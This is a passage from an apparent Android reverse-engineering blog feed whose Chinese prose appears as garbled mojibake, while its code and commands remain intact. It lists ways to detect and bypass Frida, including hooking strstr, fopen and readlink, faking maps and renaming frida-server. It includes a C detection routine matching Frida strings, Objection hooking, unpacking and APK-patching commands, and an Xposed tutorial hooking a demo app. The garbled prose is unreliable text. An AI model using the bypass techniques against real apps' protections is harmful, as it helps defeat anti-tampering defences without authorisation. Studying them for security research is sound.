xxx.js</code>å³å¯ç»•è¿‡</li><li>fridaserverä½¿ç”¨<strong>D-Busæ£€æµ‹</strong>ï¼ŒD-Busæ˜¯ä¸€ç§è¿›ç¨‹é€šä¿¡æœºåˆ¶ï¼Œé€šè¿‡éå†ç«¯å£è¿›è¡Œsocketè¿æ¥ï¼Œå¦‚æœæˆåŠŸåˆ™æœ‰å¼€æ”¾ç«¯å£ï¼Œç„¶åçœ‹çœ‹å“åº”æ˜¯ä¸æ˜¯â€œREJECTâ€ï¼Œæ˜¯åˆ™å¼€å¯fridaæœåŠ¡å™¨ï¼ˆä¸€èˆ¬æ¥è®²å¦‚æœå‡ºç°ä¸€ä¸ªAppå¯åŠ¨åè¿‡äº†ä¸€ä¼šå°±é€€å‡ºé‚£ä¹ˆå°±æœ‰å¯èƒ½æ˜¯è¿™ç§æ£€æµ‹æ–¹æ¡ˆã€‚ï¼‰å¯ä»¥éå†/proc/net/tcpæ–‡ä»¶ï¼Œæˆ–è€…ç›´æ¥ä»0-65535å‘æ¯ä¸ªå¼€æ”¾çš„ç«¯å£å‘é€D-busè®¤è¯æ¶ˆæ¯ï¼Œå“ªä¸ªç«¯å£å›å¤äº†REJECTï¼Œå°±æ˜¯frida-server</li><li>è¿›ç¨‹åæ£€æµ‹ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰fridaç›¸å…³ï¼Œå¦‚fridaserverï¼Œä½†æ˜¯é«˜ç‰ˆæœ¬å®‰å“è¿™ä¸ªæ£€æµ‹æ— æ•ˆ</li><li>frida-serverå¯åŠ¨å<code>/proc/net/tcp</code>å’Œ<code>/proc/net/tcp6</code>ä¸­ä¼šæœ‰ç‰¹æ®Šæ ‡è¯†:69a2ï¼Œå¯ä»¥é€šè¿‡æœç´¢tcpä¸­çš„å­—ç¬¦ä¸²æ¥æ£€æµ‹fridaæ˜¯å¦å¯åŠ¨</li><li>/proc/self/attr/prev æ–‡ä»¶è‹¥æ˜¯u:r:zygote:s0ï¼Œåˆ™æœ‰ç”¨é¢å…·çš„magisk zygiskæ¨¡å—</li><li>proc/pid/statusçš„TracePidå€¼ ==ã€‹ proc/pid2/cmdlineæŸ¥çœ‹è°ƒè¯•å™¨è¿›ç¨‹å</li></ul><h3 id="è¿½è¸ªç›‘æµ‹ç‚¹"><strong>è¿½è¸ªç›‘æµ‹ç‚¹</strong></h3><ol><li><p>ä½¿ç”¨r0traceçœ‹è°ƒç”¨çš„javaå±‚å‡½æ•°</p></li><li><p>hook dlopenå‡½æ•°ï¼ŒåŠ è½½soæ–‡ä»¶ ä¸€èˆ¬æ–­åœ¨å“ªé‡Œå“ªé‡Œå°±æœ‰å¯èƒ½æœ‰fridaæ£€æµ‹</p><p>å¯ä»¥ç›´æ¥jsè„šæœ¬hook dlopenæˆ–è€…ä½¿ç”¨frida-trace æ‰¾åˆ°ç›®æ ‡soç„¶åè¿›è¡Œåˆ†æ</p><p><code>frida-trace -U -f package -i dlopen(å‡½æ•°å)</code></p></li></ol><h3 id="å‡ ç§ç»•è¿‡æ–¹æ³•">å‡ ç§ç»•è¿‡æ–¹æ³•</h3><ol><li><p>çº¿ç¨‹æ£€æµ‹ å°†å‡½æ•°NewObjectç½®ç©ºç»•è¿‡æ£€æµ‹<br><img src="/posts/b00b5fdb.htm/image-20240504110300858.png" alt="image-20240504110300858"></p></li><li><p>hook strstrå‡½æ•° åŒ¹é…ä¸Šäº†å°±strstrè¿”å›å€¼ç½®0 ç±»æ¯”strcmp<br><img src="/posts/b00b5fdb.htm/image-20240504110756791.png" alt=" "></p></li></ol><p>3.statå‡½æ•°<br><img src="/posts/b00b5fdb.htm/image-20240504111746824.png" alt="image-20240504111746824"></p><p>4.fopenå‡½æ•°<br><img src="/posts/b00b5fdb.htm/image-20240504112039454.png" alt="image-20240504112039454"></p><p>5.fgetså‡½æ•°<br><img src="/posts/b00b5fdb.htm/image-20240504112217742.png" alt="image-20240504112217742"></p><p>6.mapsæ£€æµ‹ ä¼ªé€ maps<br><img src="/posts/b00b5fdb.htm/image-20240504112530798.png" alt="image-20240504112530798"></p><p>7.ç«¯å£ç»•è¿‡<br>å¯åŠ¨frida-server æ¢è¿›ç¨‹åï¼Œç›‘å¬0.0.0.0:8899  ./ffff -l 0.0.0.0:8899</p><p>ç”¨æˆ·ç«¯è¿æ¥æ–¹å¼ ï¼š frida -H ipï¼šç«¯å£ -F -l xxx.js</p><p>8.fdæ£€æµ‹</p><p>fdçš„å¼•ç”¨ä¸€èˆ¬ä½¿ç”¨readlink()å‡½æ•° hookè¿™ä¸ªå‡½æ•°å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">bool <span class="title function_">check_fd</span><span class="params">()</span> &#123;</span><br><span class="line">    DIR *dir = NULL;</span><br><span class="line">    struct dirent *entry;</span><br><span class="line">    <span class="type">char</span> link_name[<span class="number">100</span>];</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="type">bool</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ((dir = opendir(<span class="string">&quot;/proc/self/fd/&quot;</span>)) == NULL) &#123;</span><br><span class="line">        LOGI(<span class="string">&quot; %s - %d  error:%s&quot;</span>, __FILE__, __LINE__, strerror(errno));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        entry = readdir(dir);</span><br><span class="line">        <span class="keyword">while</span> (entry) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (entry-&gt;d_type) &#123;</span><br><span class="line">                <span class="keyword">case</span> DT_LNK:</span><br><span class="line">                    sprintf(link_name, <span class="string">&quot;%s/%s&quot;</span>, <span class="string">&quot;/proc/self/fd/&quot;</span>, entry-&gt;d_name);</span><br><span class="line">                    readlink(link_name, buf, sizeof(buf));</span><br><span class="line">                    <span class="keyword">if</span> (strstr(buf, <span class="string">&quot;frida&quot;</span>) || strstr(buf, <span class="string">&quot;gum-js-loop&quot;</span>) ||</span><br><span class="line">                        strstr(buf, <span class="string">&quot;gmain&quot;</span>) ||</span><br><span class="line">                        strstr(buf, <span class="string">&quot;-gadget&quot;</span>) || strstr(buf, <span class="string">&quot;linjector&quot;</span>)) &#123;</span><br><span class="line">                        LOGI(<span class="string">&quot;check_fd -&gt; find frida:%s&quot;</span>, buf);</span><br><span class="line">                        ret = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            entry = readdir(dir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dir);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>syscall ==ã€‹Frida -Seccomp</p><p>bç«™fridaæ£€æµ‹åˆ†ææ¡ˆä¾‹ï¼šbilibili <a href="https://bbs.kanxue.com/thread-278282.htm">https://bbs.kanxue.com/thread-278282.htm</a></p><h1>Objectionä½¿ç”¨</h1><p>~/.objection/objection.logå­˜æ”¾æ—¥å¿—ï¼Œå¥½åƒæ¯æ¬¡è¿è¡Œéƒ½ä¼šåœ¨è¿™ä¸ªlogæ–‡ä»¶ä¸­æ›´æ–°ï¼Œæ‰€ä»¥åœ¨å¾—åˆ°ç‰¹å®šæ—¥å¿—åé€€å‡ºobjectionï¼Œç„¶åæŠŠobjection.logæ¢åæ”¾åœ¨åˆ«çš„ç›®å½•ä¸‹é¿å…å—åˆ°å¹²æ‰°</p><p>è¿›å…¥objectionè°ƒè¯•æ—¶ æŒ‰ç©ºæ ¼æœ‰æç¤º !ls</p><ul><li>æ³¨å…¥è¿›ç¨‹</li></ul><p><code>objection -g åŒ…å explore</code></p><ul><li>æŸ¥çœ‹å†å²å‘½ä»¤</li></ul><p><code>commands history</code></p><ul><li>åˆ—å‡ºå†…å­˜æ‰€æœ‰çš„ç±»</li></ul><p><code>android hooking list classes</code></p><ul><li>åˆ—å‡ºå½“å‰å¯ç”¨activities</li></ul><p><code>android hooking list activities</code></p><ul><li>è·å¾—å½“å‰ç•Œé¢çš„activity</li></ul><p><code>android hooking get current_activity</code></p><ul><li>åœ¨å†…å­˜ä¸­æ‰€æœ‰åŠ è½½çš„ç±»ä¸­æœç´¢åŒ…å«ç‰¹å®šå…³é”®è¯çš„ç±»</li></ul><p><code>android hooking search classes com.xiaojianbang.app</code></p><ul><li>åˆ—å‡ºç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•(ä¸åŒ…æ‹¬æ„é€ æ–¹æ³•)</li></ul><p><code>android hooking list class_methods com.xiaojianbang.app.MD5</code></p><ul><li>hookç±»ä¸‹çš„æ‰€æœ‰æ–¹æ³•</li></ul><p><code>android hooking watch class com.xiaojianbang.app.MD5 </code></p><ul><li>æŸ¥çœ‹hookäº†å¤šå°‘ä¸ªç±»</li></ul><p><code>jobs list</code></p><ul><li>å»é™¤hookçš„ç±»</li></ul><p><code>jobs kill + job ID</code></p><ul><li>hookæ–¹æ³•çš„å‚æ•° è¿”å›å€¼ è°ƒç”¨æ ˆ(ä¼šé»˜è®¤hookå®ƒçš„é‡è½½å‡½æ•°)</li></ul><p><code>android hooking watch class_method com.xiaojianbang.app.MD5.md5_1 --dump-args --dump-return --dump-backtrace</code></p><ul><li>hookå…¶ä¸­çš„ä¸€ä¸ªé‡è½½ æŒ‡å®šå‚æ•°ç±»å‹ï¼Œå¤šä¸ªå‚æ•°é€—å·éš”å¼€</li></ul><p><code>android hooking watch class_method com.xiaojianbang.app.Utils.test &quot;com.xiaojianbang.app.Money&quot;</code></p><ul><li>æœç´¢å †ä¸­çš„å®ä¾‹</li></ul><p><code>android heap search instances &quot;com.xiaojianbang.app.Money&quot; </code></p><ul><li>åˆ—å‡ºæŸä¸ªåº”ç”¨ä¸­çš„ç±»</li></ul><p><code>android hooking search classes åŒ…å</code></p><ul><li>å¯»æ‰¾æŸä¸ªæ–¹æ³•</li></ul><p><code>android hooking search methods+æ–¹æ³•å</code></p><ul><li><p>hook æŸä¸ªç‰¹å®šçš„æ–¹æ³•<br>android hooking watch class_method æ–¹æ³•å å‚æ•°1ï¼Œå‚æ•°2 --dump-args --dump-backtrace --dump-return</p></li><li><p>è°ƒç”¨å®ä¾‹çš„æ–¹æ³•</p></li></ul><p><code>android heap execute åœ°å€(æŸ¥æ‰¾å®ä¾‹æ—¶çš„HashCode) æ–¹æ³•å</code></p><ul><li><p>android heap evaluate+æŸ¥æ‰¾å®ä¾‹æ—¶çš„HashCode+è°ƒç”¨çš„æ–¹æ³•å   è°ƒç”¨å¸¦å‚æ•°çš„æ–¹æ³•</p></li><li><p>ä»¥ipæ–¹å¼è¿æ¥</p></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fridaç«¯</span><br><span class="line">./frida-server -l <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">9999</span></span><br><span class="line"></span><br><span class="line">å¦ä¸€ç«¯cmd</span><br><span class="line">objection -N -h æ‰‹æœºip -<span class="selector-tag">p</span> <span class="number">9999</span> -<span class="selector-tag">g</span> åŒ…å explore</span><br></pre></td></tr></table></figure><ul><li>å¯åŠ¨å‰hookæŸæ–¹æ³•(spawnæ¨¡å¼)</li></ul><p><code>objection -N -h æ‰‹æœºip -p 9999 -g åŒ…å explore --startup-command &quot;android hooking watch class_method 'com.xiaojianbang.app.Utils.getCalc'&quot;</code></p><p>ä½¿ç”¨Wallbreakeræ’ä»¶</p><ul><li>åŠ è½½æ’ä»¶</li></ul><p><code>plugin load D:/fridaproject/frida-agent-example/fridascript/Wallbreaker-mas ter</code></p><p>æˆ–è€…</p><p><code>objection -g åŒ…å export -P + æ’ä»¶è·¯å¾„</code></p><ul><li>æœç´¢ç±»</li></ul><p><code>plugin wallbreaker classsearch com.xiaojianbang.app.Money</code></p><ul><li>æœç´¢å¯¹è±¡</li></ul><p><code>plugin wallbreaker objectsearch com.xiaojianbang.app.Money</code></p><ul><li>è¾“å‡ºç±»çš„ç»“æ„</li></ul><p><code>plugin wallbreaker classdump --fullname com.xiaojianbang.app.Money</code></p><ul><li>å¯¹è±¡ç»“æ„</li></ul><p><code>plugin wallbreaker objectdump &lt;handle&gt;</code></p><p>handleä¸º<code>plugin wallbreaker objectsearch com.xiaojianbang.app.Money</code>å‰é¢çš„å€¼</p><p>å¦ä¸€ä¸ªæ’ä»¶ frida-dexdump å¯ä»¥è„±éƒ¨åˆ†å£³ å¦‚360</p><ul><li>åŠ è½½</li></ul><p><code>plugin load D:/fridaproject/frida-agent-example/fridascript/frida-dexdump-master/frida_dexdump</code></p><ul><li>è„±å£³</li></ul><p><code>plugin dexdump dump</code></p><ul><li><p>å¼€å¯ä¸€ä¸ªå­˜åœ¨çš„Activity</p><p><code>android intent launch_activity Activityæ‰€åœ¨çš„ç±»è·¯å¾„</code><br>frida-dump -UF -d   <code>-d</code>==ã€‹æ·±åº¦æœç´¢</p></li><li><p>æŸ¥çœ‹å†…å­˜ä¸­åŠ è½½çš„æ¨¡å—</p></li></ul><p><code>memory list modules</code></p><ul><li>æŸ¥çœ‹æ¨¡å—çš„å¯¼å‡ºè¡¨</li></ul><p><code>memory list exports æ¨¡å—å</code> --json +è·¯å¾„  æ‰“å‡ºå¯¼å‡ºå‡½æ•°åå­—å’Œåœ°å€(åˆ°è·¯å¾„ä¸­)</p><ul><li>dumpæŒ‡å®šå†…å­˜</li></ul><p><code>memory dump frome_base +èµ·å§‹åœ°å€+dumpçš„å¤§å° +è¾“å‡ºè·¯å¾„</code></p><ul><li>objection æ‰¹é‡trace</li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">å…ˆ android hooking  android hooking search classes åŒ…å è·å¾—æ‰€æœ‰çš„ç±»</span><br><span class="line">å† æŠŠå‘½ä»¤ android hooking watch <span class="keyword">class</span> ç±»<span class="number">1</span> android hooking watch <span class="keyword">class</span> ç±»<span class="number">2.</span>.. å†™å…¥ä¸€ä¸ªtxtä¸­</span><br><span class="line">æœ€å æ‰§è¡Œ objection -g åŒ…å <span class="keyword">export</span> -c åŠ è½½çš„txtæ–‡ä»¶</span><br><span class="line">å°±å¯ä»¥æ‰§è¡Œtxtä¸­çš„æ‰€æœ‰å‘½ä»¤</span><br><span class="line"></span><br><span class="line">nano cipher.txt</span><br><span class="line">sed -i -e <span class="string">&#x27;s/^/android hooking watch class /&#x27;</span> cipher.txt</span><br><span class="line">æ³¨æ„<span class="keyword">class</span>åé¢çš„ä¸€ä¸ªç©ºæ ¼</span><br></pre></td></tr></table></figure><ul><li>å…rootä½¿ç”¨objectionæ“ä½œapp<br>objection patchapk --architecture + apkä¸­libä¸‹çš„å­˜åœ¨æ¶æ„ --source apkåç§°<br>objection  patchapk  --architecture armeabi-v7a --use-aapt2  --source yourAPK.apk</li></ul>]]></content>
    
    
    <summary type="html">ğŸ¥fridaä¸objectionåŸºæœ¬æ“ä½œæ•´ç†ä¸å½’çº³</summary>
    
    
    
    <category term="Androidé€†å‘" scheme="https://zxk1ng.github.io/categories/Android%E9%80%86%E5%90%91/"/>
    
    
    <category term="Androidé€†å‘" scheme="https://zxk1ng.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
    <category term="hook" scheme="https://zxk1ng.github.io/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>Xposedæ¡†æ¶</title>
    <link href="https://zxk1ng.github.io/posts/947764cb.html"/>
    <id>https://zxk1ng.github.io/posts/947764cb.html</id>
    <published>2025-01-15T07:06:48.000Z</published>
    <updated>2025-01-15T07:14:39.053Z</updated>
    
    <content type="html"><![CDATA[<h1>Xposedæ¡†æ¶</h1><h2 id="ä¸€-Hookä¿®æ”¹é™æ€å˜é‡">ä¸€.Hookä¿®æ”¹é™æ€å˜é‡</h2><h3 id="ç›®æ ‡ï¼šhookæ‰demoçš„é™æ€å˜é‡tagï¼ŒstaticIntimage-20230714120304119">ç›®æ ‡ï¼šhookæ‰demoçš„é™æ€å˜é‡tagï¼ŒstaticInt<img src="/posts/947764cb.htm/image-20230714120304119.png" alt="image-20230714120304119"></h3><h3 id="ä»£ç å®ç°å¦‚ä¸‹">ä»£ç å®ç°å¦‚ä¸‹</h3><p>å› ä¸ºxposedæ˜¯ä¸ªæ¡†æ¶ï¼Œæ‰€ä»¥æ•´ä½“æ¡†æ¶ä¸ä¼šå¤ªå¤§å˜åŒ–ï¼Œä¸»è¦å°±æ˜¯å†™å›è°ƒå‡½æ•°handleLoadPackageæ–¹æ³•é‡Œçš„ä¸œè¥¿</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//XposedBridge.log(TAG+&quot;|&quot;+&quot;æˆ‘æŠ“åˆ°ä½ äº†:&quot;+loadPackageParam.packageName);</span></span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticIntField(clazz,<span class="string">&quot;staticInt&quot;</span>,<span class="number">1000</span>);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Log.d()ï¼šè¾“å‡ºä¸€äº›å†…å®¹ï¼Œç”¨æ¥æ ‡å¿—Start Hookâ€¦</li><li>loadPackageParam.packageName.equals(â€˜åŒ…åâ€™)ï¼šhookåˆ°çš„åŒ…ä¸æ‰€ç»™åŒ…åç›¸æ¯”è¾ƒã€‚è¿™é‡Œå°±æ˜¯å¦‚æœæ˜¯è‡ªå·±æƒ³è¦çš„åŒ…ï¼Œå°±è¿‡æ»¤å‡ºè¿™ä¸ªåŒ…ï¼Œå¹¶è¿›è¡Œä¸‹é¢çš„æ“ä½œã€‚</li><li>XposedHelpers.findClass(String className, ClassLoader classLoader):è·å–è¯¥ç±»</li><li>XposedHelpers.setStaticIntField(Class&lt;?&gt; clazz, String fieldName, int value)ï¼šä¿®æ”¹é™æ€intå˜é‡</li><li>XposedHelpers.setStaticObjectField(Class&lt;?&gt; clazz, String fieldName, Object value):ä¿®æ”¹é™æ€Stringå˜é‡</li></ul><h3 id="ç”Ÿæˆæ¨¡å—">ç”Ÿæˆæ¨¡å—</h3><ol><li>ç‚¹å‡»ï¼Œç”Ÿæˆapk<br><img src="/posts/947764cb.htm/image-20230714123338943.png" alt="image-20230714123338943"></li><li>æŠŠç”Ÿæˆçš„apkæ‹–å…¥æ¨¡æ‹Ÿå™¨,è¿›å…¥Xposedæ¡†æ¶ï¼Œæ¿€æ´»æ¨¡å—ï¼Œè½¯é‡å¯ã€‚</li></ol><h3 id="æ‰§è¡Œç»“æœ">æ‰§è¡Œç»“æœ</h3><ul><li><p>å®‰è£…appï¼Œå› ä¸ºæˆ‘æ‹–åŠ¨å®‰è£…è¯´ä¸è¢«å…è®¸æµ‹è¯•ï¼Œä½¿ç”¨å‘½ä»¤ adb install -t app.apkå®‰è£…</p></li><li><p>æ‰“å¼€demo app<br><img src="/posts/947764cb.htm/image-20230714124021025.png" alt="image-20230714124021025"></p></li><li><p>è¿›è¡Œè¿‡æ»¤ï¼š<img src="/posts/947764cb.htm/image-20230714122629300.png" alt="image-20230714122629300"></p></li><li><p>æ‰§è¡Œdemo<br><img src="/posts/947764cb.htm/image-20230714122801050.png" alt="image-20230714122801050"></p></li><li><p>ç»“æœ<br><img src="/posts/947764cb.htm/image-20230714123145948.png" alt="image-20230714123145948"></p></li></ul><h2 id="äºŒ-Hookæ„é€ å‡½æ•°">äºŒ.Hookæ„é€ å‡½æ•°</h2><h3 id="ç›®æ ‡ï¼šhookæ‰demoçš„æ„é€ å‡½æ•°image-20230714181704240">ç›®æ ‡ï¼šhookæ‰demoçš„æ„é€ å‡½æ•°<img src="/posts/947764cb.htm/image-20230714181704240.png" alt="image-20230714181704240"></h3><h3 id="ä»£ç å®ç°å¦‚ä¸‹-2">ä»£ç å®ç°å¦‚ä¸‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposedå…¨å±€è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//XposedBridge.log(TAG+&quot;|&quot;+&quot;æˆ‘æŠ“åˆ°ä½ äº†:&quot;+loadPackageParam.packageName);</span></span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        <span class="comment">//XposedHelpers.setStaticIntField(clazz,&quot;staticInt&quot;,1000);</span></span><br><span class="line">        <span class="comment">//XposedHelpers.setStaticObjectField(clazz,&quot;Tag&quot;,&quot;zxk1ng&quot;);</span></span><br><span class="line">        XposedHelpers.findAndHookConstructor(clazz, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;è¿™æ˜¯æ— å‚æ„é€ å‡½æ•°å‰&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;è¿™æ˜¯æ— å‚æ„é€ å‡½æ•°å&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        XposedHelpers.findAndHookConstructor(clazz, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                param.args[<span class="number">0</span>]=<span class="string">&quot;xposedä¸“é¢˜&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;è¿™æ˜¯æœ‰å‚æ„é€ å‡½æ•°å&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>XposedHelpers.findAndHookConstructor(Class&lt;?&gt; clazz, Objectâ€¦ parameterTypesAndCallback)ï¼šhookæ„é€ æ–¹æ³•ï¼Œå‚æ•°ä¸ºclazz, new XC_MethodHook()ï¼Œclazzä¸ºåŠ è½½çš„ç±»ã€‚è¿™ä¸ªhookæ„é€ æ–¹æ³•çš„å‚æ•°å¯ä»¥åŠ xxx.classï¼ŒæŒ‡å®šhookæ–¹æ³•çš„å‚æ•°åˆ—è¡¨ï¼Œxxxä¸ºæ„é€ 